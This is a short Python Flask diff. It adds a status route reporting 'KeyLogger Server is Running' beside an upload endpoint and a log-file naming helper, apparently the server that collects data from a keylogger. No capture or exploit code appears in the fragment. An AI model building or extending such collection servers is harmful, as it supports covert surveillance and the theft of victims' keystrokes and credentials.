@@ -11,6 +11,11 @@ if not os.path.exists(DATA_FOLDER):
 def generate_log_filename():
     return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
 
+@app.route('/')
+def home():
+    return "KeyLogger Server is Running"
+
+
 @app.route('/api/upload', methods=['POST'])
 def upload():
     data = request.get_json()
